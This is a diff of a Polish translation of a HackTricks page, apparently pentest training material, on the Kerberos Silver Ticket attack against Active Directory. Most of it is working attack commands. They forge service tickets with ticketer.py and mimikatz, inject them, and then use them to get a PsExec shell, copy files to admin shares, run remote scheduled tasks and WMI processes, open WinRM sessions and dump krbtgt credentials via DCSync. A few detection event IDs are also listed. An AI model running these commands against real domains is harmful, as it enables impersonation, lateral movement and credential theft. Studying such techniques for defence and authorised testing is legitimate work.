@@ -2,37 +2,37 @@
 
 <details>
 
-<summary><strong>Dowiedz się, jak hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Inne sposoby wsparcia HackTricks:
 
-* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
+* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
+* Kup [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
 * Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 
-<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
+<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
 
-Jeśli interesuje Cię **kariera hakerska** i hakowanie niemożliwych do zhakowania rzeczy - **zatrudniamy!** (_wymagane biegłe posługiwanie się językiem polskim w mowie i piśmie_).
+**Wskazówka dotycząca nagrody za błąd**: **Zarejestruj się** na platformie **Intigriti**, premium **platformie nagród za błędy stworzonej przez hakerów, dla hakerów**! Dołącz do nas na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) już dziś i zacznij zarabiać nagrody aż do **100 000 USD**!
 
-{% embed url="https://www.stmcyber.com/careers" %}
+{% embed url="https://go.intigriti.com/hacktricks" %}
 
 ## Bilet srebrny
 
-Atak **Bilet srebrny** polega na wykorzystaniu biletów usługi w środowiskach Active Directory (AD). Ta metoda polega na **uzyskaniu skrótu NTLM konta usługi**, takiego jak konto komputera, w celu sfałszowania biletu usługi Ticket Granting Service (TGS). Dzięki temu sfałszowanemu biletowi, atakujący może uzyskać dostęp do określonych usług w sieci, **udając dowolnego użytkownika**, zwykle dążąc do uzyskania uprawnień administracyjnych. Podkreśla się, że korzystanie z kluczy AES do fałszowania biletów jest bardziej bezpieczne i mniej wykrywalne.
+Atak **Bilet srebrny** polega na wykorzystaniu biletów usług w środowiskach Active Directory (AD). Ta metoda polega na **uzyskaniu hasha NTLM konta usługi**, takiego jak konto komputera, w celu sfałszowania biletu Granting Service (TGS). Dzięki temu sfałszowanemu biletowi atakujący może uzyskać dostęp do określonych usług w sieci, **podając się za dowolnego użytkownika**, zwykle dążąc do uzyskania uprawnień administracyjnych. Podkreśla się, że używanie kluczy AES do fałszowania biletów jest bardziej bezpieczne i mniej wykrywalne.
 
-Do tworzenia biletów używane są różne narzędzia, w zależności od systemu operacyjnego:
+Do tworzenia biletów używane są różne narzędzia w zależności od systemu operacyjnego:
 
-### W systemie Linux
+### Na Linuxie
 ```bash
 python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
 export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
 python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
 ```
-### Na systemie Windows
+### Na Windows
 ```bash
 # Create the ticket
 mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"
@@ -44,49 +44,41 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 # Obtain a shell
 .\PsExec.exe -accepteula \\<TARGET> cmd
 ```
-Usługa CIFS jest wyróżniona jako powszechny cel ataku w celu uzyskania dostępu do systemu plików ofiary, ale inne usługi, takie jak HOST i RPCSS, mogą również być wykorzystane do zadań i zapytań WMI.
+## Dostępne Usługi
 
-## Dostępne usługi
-
-| Rodzaj usługi                              | Bilety srebrne dla usługi                                                     |
-| ------------------------------------------ | -------------------------------------------------------------------------- |
-| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
-| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>W zależności od systemu operacyjnego również:</p><p>WSMAN</p><p>RPCSS</p> |
+| Rodzaj Usługi                              | Bilety Silver dla Usługi                                                |
+| ------------------------------------------ | ----------------------------------------------------------------------- |
+| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                |
+| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>W zależności od systemu operacyjnego także:</p><p>WSMAN</p><p>RPCSS</p> |
 | WinRM                                      | <p>HOST</p><p>HTTP</p><p>W niektórych przypadkach można po prostu poprosić o: WINRM</p> |
-| Zaplanowane zadania                         | HOST                                                                       |
-| Udostępnianie plików systemu Windows, również psexec            | CIFS                                                                       |
-| Operacje LDAP, w tym DCSync           | LDAP                                                                       |
-| Narzędzia zdalnego zarządzania serwerem Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
-| Bilety złote                             | krbtgt                                                                     |
+| Zadania Zaplanowane                        | HOST                                                                   |
+| Windows File Share, również psexec          | CIFS                                                                   |
+| Operacje LDAP, w tym DCSync                | LDAP                                                                   |
+| Narzędzia Administracji Zdalnej Serwera Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                     |
+| Golden Tickets                             | krbtgt                                                                 |
 
 Za pomocą **Rubeus** możesz **poprosić o wszystkie** te bilety, używając parametru:
 
 * `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`
 
-### ID zdarzeń dla biletów srebrnych
+### ID Wydarzeń dla Biletów Silver
 
-* 4624: Logowanie konta
-* 4634: Wylogowanie konta
-* 4672: Logowanie administratora
+* 4624: Logowanie do Konta
+* 4634: Wylogowanie z Konta
+* 4672: Logowanie Administratora
 
-## Nadużywanie biletów usług
+## Nadużywanie Biletów Usług
 
-W poniższych przykładach załóżmy, że bilet jest pobierany przez podszywanie się pod konto administratora.
+W poniższych przykładach załóżmy, że bilet został pozyskany poprzez podszywanie się pod konto administratora.
 
 ### CIFS
 
-Z tym biletem będziesz mógł uzyskać dostęp do folderów `C$` i `ADMIN$` za pomocą protokołu **SMB** (jeśli są one wystawione) i skopiować pliki do części zdalnego systemu plików, wykonując coś w stylu:
+Dzięki temu biletowi będziesz mógł uzyskać dostęp do folderów `C$` i `ADMIN$` za pomocą **SMB** (jeśli są one dostępne) i skopiować pliki do części systemu plików zdalnego wykonując coś w rodzaju:
 ```bash
 dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
 copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 ```
-Będziesz również w stanie uzyskać powłokę wewnątrz hosta lub wykonywać dowolne polecenia za pomocą **psexec**:
-
-{% content-ref url="../ntlm/psexec-and-winexec.md" %}
-[psexec-and-winexec.md](../ntlm/psexec-and-winexec.md)
-{% endcontent-ref %}
-
 ### HOST
 
 Z tym uprawnieniem możesz generować zaplanowane zadania na zdalnych komputerach i wykonywać dowolne polecenia:
@@ -103,7 +95,7 @@ schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
 ```
 ### HOST + RPCSS
 
-Z tymi biletami możesz **wykonywać WMI w systemie ofiary**:
+Z tymi biletami możesz **wykonać WMI w systemie ofiary**:
 ```bash
 #Check you have enough privileges
 Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
@@ -113,7 +105,7 @@ Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlis
 #You can also use wmic
 wmic remote.computer.local list full /format:list
 ```
-Znajdź **więcej informacji na temat wmiexec** na następnej stronie:
+Znajdź **więcej informacji o wmiexec** na następnej stronie:
 
 {% content-ref url="../ntlm/wmicexec.md" %}
 [wmicexec.md](../ntlm/wmicexec.md)
@@ -121,11 +113,11 @@ Znajdź **więcej informacji na temat wmiexec** na następnej stronie:
 
 ### HOST + WSMAN (WINRM)
 
-Z dostępem do winrm na komputerze możesz **uzyskać do niego dostęp** i nawet uruchomić PowerShell:
+Z dostępem winrm do komputera możesz **uzyskać do niego dostęp** i nawet uruchomić PowerShell:
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
-Sprawdź następującą stronę, aby dowiedzieć się **więcej sposobów na połączenie z zdalnym hostem za pomocą winrm**:
+Sprawdź następną stronę, aby dowiedzieć się **więcej sposobów łączenia się z hostem zdalnym za pomocą winrm**:
 
 {% content-ref url="../ntlm/winrm.md" %}
 [winrm.md](../ntlm/winrm.md)
@@ -137,13 +129,14 @@ Zauważ, że **winrm musi być aktywny i nasłuchiwać** na zdalnym komputerze, 
 
 ### LDAP
 
-Z tym uprawnieniem możesz wydobyć bazę danych DC za pomocą **DCSync**:
+Z tym uprawnieniem możesz wykonać zrzut bazy danych DC za pomocą **DCSync**:
 ```
 mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
 ```
 **Dowiedz się więcej o DCSync** na następnej stronie:
 
 ## Referencje
+
 * [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
 * [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
 
@@ -151,11 +144,11 @@ mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.loc
 [dcsync.md](dcsync.md)
 {% endcontent-ref %}
 
-<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
+<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
 
-Jeśli interesuje Cię **kariera hakera** i hakowanie niemożliwych do zhakowania rzeczy - **zatrudniamy!** (_wymagane biegłe posługiwanie się językiem polskim w mowie i piśmie_).
+**Wskazówka dotycząca bug bounty**: **Zarejestruj się** na platformie bug bounty **Intigriti**, stworzonej przez hakerów, dla hakerów! Dołącz do nas na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) już dziś i zacznij zarabiać nagrody aż do **$100,000**!
 
-{% embed url="https://www.stmcyber.com/careers" %}
+{% embed url="https://go.intigriti.com/hacktricks" %}
 
 <details>
 
@@ -163,10 +156,10 @@ Jeśli interesuje Cię **kariera hakera** i hakowanie niemożliwych do zhakowani
 
 Inne sposoby wsparcia HackTricks:
 
-* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
+* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
 * Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
 * Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) **i** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **repozytoriów na GitHubie.**
+* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
